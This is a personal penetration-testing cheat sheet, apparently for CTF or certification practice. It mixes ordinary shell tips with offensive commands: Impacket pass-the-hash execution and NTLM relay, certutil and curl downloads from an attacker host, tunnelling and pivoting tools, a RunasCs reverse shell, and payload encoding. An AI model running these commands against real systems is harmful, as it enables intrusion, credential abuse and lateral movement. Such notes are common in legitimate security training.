Last update: 2025.11.14
### Kali Snapshots:
**Backup:** `wsl --export kali-linux .\Kali\<yymmdd>.tar`
**Restore:** `wsl --import kali-linux <backup.tar>`

---
### Alias:
Check history: `hist <string>`
Create Python virtual environment: `pyvenvcreate`
Start Python virtual environment: `pyvenvstart`
Destroy Python virtual environment: `pyvenvdestroy`
Fake time: `timefake <dns-server> <command>`
GitHub release download: `ghrelease`
Initialize PyEnv: `pyenvinit`
Generate usernames from name list: `usernamegen`

---
### PyEnv:
###### Initialize: (only active in shell session)
- `pyenvinit`
- `eval "$(pyenv init --path)"`
###### Install Python version:
- `pyenv install x.x.x`
###### Set local version:
- `pyenv local x.x.x`
###### Use with Virtual Environments:
- Ad-Hoc: `pyenv local x.x.x; python -m venv venv; source venv/bin/activate;`
- Shared: `pyvenvdestroy; pyenv local x.x.x; pyvenvcreate; pyvenvstart`

---
### Symlinks:
`ln -s <original_file> <symlink_name>`

---
### Fake Time for Kerberos Interactions:
`faketime "$(ntpdate -q <DOMAIN> | cut -d ' ' -f 1,2)" <COMMAND>`

---
### Impacket:
###### Get TGT:
- `impacket-getTGT -dc-ip <IP> '<domain.tld>/<user>:<password>'`
###### MSSQL Client:
- `impacket-mssqlclient <user>:<password>@<target> -windows-auth`
###### PS Exec:
- `impacket-psexec -hashes 00000000000000000000000000000000:<NT> <user>@<IP>`
###### WMI Exec:
- `impacket-wmiexec -hashes 00000000000000000000000000000000:<NT> <user>@<IP>`
###### NTLM Relay:
- `impacket-ntlmrelayx --no-http-server -smb2support -t <relay target> -c "<command>"`

---
### File Transfer (Windows):
###### Curl:
- `curl http://<IP>:<PORT>/<file> -o C:\Users\Public\Downloads\<file>`
###### SMB:
- Host: `sudo impacket-smbserver share -smb2support <path> -user test -password test`
- Target: `net use n: \\<IP>\share /user:test test`
- Copy: `copy n:\<kali_file> .`; `copy <target_file> n:\`
- Clean up: `net use n: /del`
###### CertUtil:
- `certutil.exe -f -urlcache -split http://<IP>:8000/<file> <dest_path>`
###### WinRM Base64 Copy:
- `[Convert]::ToBase64String((Get-Content "<filepath>" -Raw -Encoding byte))`
###### IWR:
- `iwr -uri http://<IP>:8000/<file> -Outfile <file>`

---
### ICACLS:
Permissions:
- `F` - Full access
- `M` - Modify
- `RX` - Read and execute
- `R` - Read only
- `W` - Write only
- `(I)` - Inherited from parent directory
Take ownership: `takeown /f <file/dir>`
Grant access: `icacls <file/dir> /grant <user>:F`

---
### Unzipping:
###### .TAR.XZ
- `tar -xf <file>.tar.xz`
###### .TAR.GZ
- `tar -xzvf <file>.tar.gz`

---
### Zipping:
###### .ZIP
- Folder: `zip -r <zip_name> <folder_name>`
- File: `zip <zip_name> <file1> <file2> ...`
###### .TAR.GZ
- Folder: `tar -czvf <name.tar.gz> <folder>`

---
### Local Port Forwarding/Tunneling:
#### Socat (Linux):
**On Agent:** `socat -ddd TCP-LISTEN:2345,fork TCP:<target_IP>:<RPORT>`

#### SSH:
**On Agent:** `ssh <user>@<IP> [-N] -L <LPORT>:<target_IP>:<RPORT>`
- `target_IP` = `localhost` for local port forwarding.
**Access point:** `agent_IP:LPORT`
- Agent is Kali in most cases

#### SSH (Dynamic):
**On Agent:** `ssh <user>@<IP> -[N] -D <LPORT>`
**Proxy config:** `/etc/proxychains4.conf`
```bash
# either socks4 or socks5
socks4 <agent_IP> <LPORT>
socks5 <agent_IP> <LPORT>
```
**Connect:** `proxychains <command>`

#### SSHuttle (Dynamic):
**Requirements:** SSH client with `root` privilege; `python3` on SSH server
**On Host:** `sshuttle -r <user>@<agent> <subnet> <subnet> ...`

#### NetSH:
**Requirements:** Administrative access; UAC bypass
**On Agent:**
1. `netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=<interface> connectport=<RPORT> connectaddress=<target_IP>`
2. `netsh advfirewall firewall add rule name="portfwd" protocol=TCP dir=in localip=<interface> localport=<LPORT> action=allow`
- NOTE: `interface` usually agent's external interface (i.e., server IP)
**Confirmation:** `netsh interface portproxy show all`
**Access point:** `interface:RPORT`
**Clean up on Agent:**
1. `netsh advfirewall firewall delete rule name="portfwd"`
2. `netsh interface portproxy del v4tov4 listenport=<LPORT> listenaddress=<interface>`

---
### Reverse Port Forwarding/Tunneling:
#### Chisel (HTTP Tunnel):
**On Host:** `./chisel server -p 5000 --reverse`
**On Agent:** `.\chisel.exe client <LHOST>:5000 R:<LPORT>:<target_IP>:<RPORT>`
**Access point:** `localhost:<LPORT>`

#### Chisel (Dynamic, HTTP Tunnel):
**On Host:** `./chisel server -p 5000 --reverse [--socks5 enabled]`
**On Agent:** `.\chisel.exe client <LHOST>:5000 R:socks`
**SSH connection:** `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:5000 %h%p' <user>@<target_IP>`

#### SSH:
**On Agent:** `ssh ch3ng@<KALI> [-N] -R [<interface>]:<LPORT>:<target_IP>:<RPORT>`
- `interface` usually loopback (`127.0.0.1`), might be optional
**Access point:** `LHOST:LPORT`

#### SSH (Dynamic):
**Requirements:** OpenSSH client >=7.6
**On Agent:** `ssh ch3ng@<KALI> [-N] -R <LPORT>`
**Proxy config:** `/etc/proxychains4.conf`
```bash
# either socks4 or socks5
socks4 127.0.0.1 <LPORT>
socks5 127.0.0.1 <LPORT>
```
**Connect:** `proxychains <command>`

#### Plink (Windows):
**Kali:** `/usr/share/windows-resources/binaries/plink.exe`
**On Agent:** `[cmd.exe /c echo y | ] .\plink.exe -ssh -l ch3ng -pw <pass> -R <interface>:<LPORT>:<target_IP>:<RPORT> <KALI>`
- `interface` usually loopback (`127.0.0.1`)
**Access point:** `interface:LPORT`

#### Ligolo-NG (Dynamic):
###### Interface setup on Host:
1. `sudo ip tuntap add user ch3ng mode tun ligolo`
2. `sudo ip link set ligolo up`
###### Initiate Ligolo-NG on Host:
- `./proxy -selfcert -laddr 0.0.0.0:9001`
###### Initiate Ligolo-NG on target:
- `./agent -connect <IP>:9001 -ignore-cert`
###### Add route on host:
- `sudo ip route add <SUBNET> dev ligolo`
###### Start session in Ligolo-NG interface:
1. `session`; select session by number
2. `start`
###### Remove route on host:
- `sudo ip route del <SUBNET> dev ligolo`
###### Remove interface on host (optional):
1. `sudo ip link set ligolo down`
2. `sudo ip tuntap del mode tun ligolo`

#### DNSCat2:
TODO

---
### Git & GitHub:
###### GitHub pull releases:
- `gh release download -p '*' -D ./release --clobber`

---
### RunasCs.exe:
###### STDIN/STDOUT Redirection:
- `.\RunasCs.exe <user> <pass> cmd.exe -r <IP>:<PORT>`

---
### AD Certificates:
###### Removing passwords from PFX:
- `certipy-ad cert -pfx encrypted.pfx -password '<pwd>' -export -out decrypted.pfx`
###### Extracting from PFX:
Using `certipy-ad`:
- Key: `certipy-ad cert -pfx <pfx> -out <key.key> -nocert`
- Cert: `certipy-ad cert -pfx <pfx> -out <cert.crt> -nokey`
Using `openssl`:
- Cert: `openssl pkcs12 -in key.pfx -clcerts -nokeys -out public.crt`
- Key: `openssl pkcs12 -in key.pfx -nocerts -out private.key`
###### Requesting TGT:
- User/pass: `impacket-getTGT -dc-ip <IP> '<domain.tld>/<user>:<pass>'`
- PFX: `certipy-ad auth -dc-ip <IP> -pfx <pfx.pfx>`

---
### RDP Connection:
###### XFreeRDP:
- `xfreerdp3 /dynamic-resolution /u:<user> /p:<pass> [/pth:<NTLM>] [/tls:seclevel:0] [/sec:tls|rdp] /v:<IP>`
###### RDesktop:
- Interactive: `rdesktop <target>`

---
### Test Files Generation:
###### Images:
- `convert -size 200x200 xc:white test.png/test.jpg`

---
### Miscellaneous:
###### Tree:
- Windows: `tree /F /A <dir>`
- Linux: `tree -r <dir>`
###### C Cross-Compile:
- Linux to x64: `x86_64-w64-mingw32-gcc program.c -o program.exe`
- Linux to x86: `i686-w64-mingw32-gcc program.c -o program.exe [-lws2_32]`
###### Recursive File Search:
- Linux: `find / -name "<file>" 2>/dev/null`
- Windows CMD: `dir /a /s /b c:\<file>`
- Windows PowerShell: `dir -r -fo c:\<file> 2>$null`
###### List non-empty directories:
- `find <path> -maxdepth 1 -type d ! -empty`
###### Exiftool:
- `exiftool [-a -u] <file>`
###### UTF-16LE Base64 Encode:
- `echo -n 0 <payload> | iconv -t utf-16le | base64 -w 0`
- `cat <file> | iconv -t utf-16le | base64 -w 0`
###### NT Hash Generation:
- `echo -n '<password>' | iconv -f UTF-8 -t UTF-16LE | openssl md4`
- `iconv -f ASCII -t UTF-16LE <(printf '<password>') | openssl dgst -md4`

---